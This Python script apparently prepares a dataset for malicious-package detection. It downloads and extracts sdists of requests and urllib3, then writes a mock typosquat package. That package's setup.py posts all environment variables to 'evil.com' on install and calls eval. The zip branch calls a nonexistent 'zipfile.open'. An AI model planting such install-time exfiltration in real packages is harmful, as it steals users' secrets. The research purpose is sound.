import os
import requests
import tarfile
import zipfile
import shutil
import logging
from pathlib import Path

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration
DATA_DIR = Path(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'data')))
RAW_DIR = DATA_DIR / 'raw'
EXTRACT_DIR = DATA_DIR / 'extracted'

RAW_DIR.mkdir(parents=True, exist_ok=True)
EXTRACT_DIR.mkdir(parents=True, exist_ok=True)

PACKAGES = [
    {"name": "requests", "version": "2.31.0", "type": "benign"},
    {"name": "urllib3", "version": "1.26.15", "type": "benign"}
]

def download_package(name, version):
    url = f"https://pypi.org/pypi/{name}/{version}/json"
    logging.info(f"Fetching metadata for {name}=={version}")
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        
        sdist_url = None
        for release in data.get("urls", []):
            if release.get("packagetype") == "sdist":
                sdist_url = release.get("url")
                filename = release.get("filename")
                break
                
        if not sdist_url:
            logging.error(f"No source distribution found for {name}=={version}")
            return None
            
        dest_path = RAW_DIR / filename
        if dest_path.exists():
            logging.info(f"File {filename} already exists. Skipping download.")
            return dest_path
            
        logging.info(f"Downloading {filename}...")
        pkg_resp = requests.get(sdist_url, stream=True)
        pkg_resp.raise_for_status()
        
        with open(dest_path, 'wb') as f:
            for chunk in pkg_resp.iter_content(chunk_size=8192):
                f.write(chunk)
                
        logging.info(f"Downloaded successfully to {dest_path}")
        return dest_path
        
    except Exception as e:
        logging.error(f"Error downloading {name}: {e}")
        return None

def extract_package(filepath):
    if not filepath or not filepath.exists():
        return None
        
    filename = filepath.name
    pkg_name = filepath.stem
    if filepath.suffix == '.gz':
        pkg_name = filepath.stem.replace('.tar', '')
        
    dest_path = EXTRACT_DIR / pkg_name
    
    if dest_path.exists():
        logging.info(f"Directory {dest_path} already exists. Skipping extraction.")
        return dest_path
        
    logging.info(f"Extracting {filename} to {dest_path}...")
    try:
        if filename.endswith('.tar.gz'):
            with tarfile.open(filepath, "r:gz") as tar:
                tar.extractall(path=EXTRACT_DIR)
        elif filename.endswith('.zip'):
            with zipfile.open(filepath, 'r') as zip_ref:
                zip_ref.extractall(path=EXTRACT_DIR)
        else:
            logging.warning(f"Unsupported archive format: {filename}")
            return None
            
        logging.info(f"Extraction complete for {filename}")
        return dest_path
    except Exception as e:
        logging.error(f"Error extracting {filename}: {e}")
        return None

def create_mock_malicious_package():
    mock_dir = EXTRACT_DIR / "requests-fake-1.0.0"
    if mock_dir.exists():
        logging.info("Mock malicious package already exists.")
        return mock_dir
        
    mock_dir.mkdir(parents=True, exist_ok=True)
    setup_py_content = """import os
import requests
import socket

# Malicious behavior: Exfiltrate env vars
def exfiltrate():
    env_data = os.environ
    requests.post('http://evil.com/exfiltrate', data=str(env_data))
    
    # Another behavior: executing arbitrary commands
    eval("print('Connecting to C2...')")
    
exfiltrate()
"""
    with open(mock_dir / "setup.py", "w", encoding="utf-8") as f:
        f.write(setup_py_content)
        
    logging.info(f"Created mock malicious package at {mock_dir}")
    return mock_dir

def main():
    logging.info("Starting Dataset Ingestion Phase")
    
    for pkg in PACKAGES:
        filepath = download_package(pkg["name"], pkg["version"])
        if filepath:
            extract_package(filepath)
            
    create_mock_malicious_package()
    logging.info("Data Ingestion Phase Complete!")

if __name__ == "__main__":
    main()
